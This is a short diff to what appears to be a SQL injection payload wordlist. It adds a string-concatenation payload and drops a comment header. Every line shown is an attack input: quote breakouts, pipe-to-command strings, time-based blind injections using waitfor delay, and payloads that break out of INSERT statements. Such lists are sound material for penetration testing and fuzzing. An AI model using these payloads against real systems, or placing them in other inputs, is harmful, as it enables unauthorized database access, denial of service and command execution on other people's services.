@@ -50,6 +50,7 @@ WF'SQL"Probe;A--B
 '|'vol
 "|"vol
 ||vol
+va'+'lues
 '+"+'
 '+''+'
 '+'somechars 
@@ -93,7 +94,6 @@ and 0=7659
 1,'0','0','0');waitfor delay '0:0:15';--
 1','0','0','0','0');
 waitfor delay '0:0:15';--
-# **for insert**
 foo')--
 foo', 1)--
 foo', 1, 1)--
